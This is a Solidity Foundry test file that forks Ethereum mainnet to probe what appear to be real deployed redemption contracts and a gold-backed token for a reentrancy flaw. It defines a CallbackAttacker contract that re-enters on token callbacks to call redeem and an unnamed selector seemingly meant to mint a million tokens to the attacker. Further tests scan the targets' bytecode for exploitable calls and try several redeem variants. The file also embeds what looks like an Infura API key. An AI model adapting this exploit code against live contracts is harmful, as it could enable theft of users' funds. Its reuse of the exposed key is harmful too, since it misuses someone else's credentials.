// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

// Attacker contract that gets called back
contract CallbackAttacker {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    address public owner;
    bool public reentered;

    constructor() {
        owner = msg.sender;
    }

    function onTokenTransfer(address, uint256, bytes calldata) external returns (bool) {
        if (!reentered) {
            reentered = true;
            _exploit();
        }
        return true;
    }

    function tokensReceived(
        address,
        address from,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (!reentered && from == REDEMPTION_0) {
            reentered = true;
            _exploit();
        }
    }

    function _exploit() internal {
        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, owner)
        );

        (bool s2,) = IAU.call(
            abi.encodeWithSelector(bytes4(0x449a52f8), owner, 1000000e18)
        );
    }

    fallback() external payable {
        if (!reentered) {
            reentered = true;
            _exploit();
        }
    }

    receive() external payable {}
}

contract CallbackExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    CallbackAttacker attackerContract;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.prank(attacker);
        attackerContract = new CallbackAttacker();
    }

    function test_AnalyzeRedemption0CallTargets() public view {
        console.log("=== ANALYZING REDEMPTION_0 CALL TARGETS ===\n");

        bytes memory code = REDEMPTION_0.code;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) {
                console.log("\nCALL at offset:", i);

                uint start = i > 150 ? i - 150 : 0;
                bool foundCalldataLoad = false;
                bool foundSload = false;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x35) {
                        foundCalldataLoad = true;
                        console.log("  CALLDATALOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x54) {
                        foundSload = true;
                    }
                    if (uint8(code[j]) == 0x33) {
                        console.log("  CALLER at:", j);
                    }
                }

                if (foundCalldataLoad && !foundSload) {
                    console.log("  ** POTENTIAL USER-CONTROLLED! **");
                }
            }
        }
    }

    function test_TryFinalizeWithCallback() public {
        console.log("=== TRYING FINALIZE WITH CALLBACK CONTRACT ===\n");

        deal(IAU, address(attackerContract), 10000e18);

        vm.startPrank(address(attackerContract));
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem from contract:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        vm.warp(block.timestamp + 8 days);

        vm.prank(address(attackerContract));
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem:", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        console.log("Reentered:", attackerContract.reentered());
    }

    function test_CheckRedeemFunctionSigs() public view {
        console.log("=== CHECKING REDEEM FUNCTION SIGNATURES ===\n");

        console.log("redeem(uint96):");
        console.logBytes4(bytes4(keccak256("redeem(uint96)")));

        console.log("redeem(uint256):");
        console.logBytes4(bytes4(keccak256("redeem(uint256)")));

        console.log("redeem(uint256,address):");
        console.logBytes4(bytes4(keccak256("redeem(uint256,address)")));

        console.log("requestRedeem(uint96):");
        console.logBytes4(bytes4(keccak256("requestRedeem(uint96)")));
    }

    function test_TryMultipleRedeemVariants() public {
        console.log("=== TRYING MULTIPLE REDEEM VARIANTS ===\n");

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        console.log("Trying different redeem selectors:");

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x7bde82f2), 100e18, attacker)
        );
        console.log("0x7bde82f2(amount, attacker):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s2);

        (bool s3,) = REDEMPTION_0.call(
            abi.encodeWithSignature("requestRedeem(uint96)", uint96(100e18))
        );
        console.log("requestRedeem(uint96):", s3);

        vm.stopPrank();
    }

    function test_CheckRedemption0Selectors() public view {
        console.log("=== CHECKING ALL REDEMPTION_0 SELECTORS ===\n");

        bytes memory code = REDEMPTION_0.code;

        bytes4[] memory uniqueSels = new bytes4[](100);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff || sel == bytes4(0)) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && selCount < 100) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                }
            }
        }

        for (uint i = 0; i < selCount; i++) {
            console.logBytes4(uniqueSels[i]);
        }
    }
}
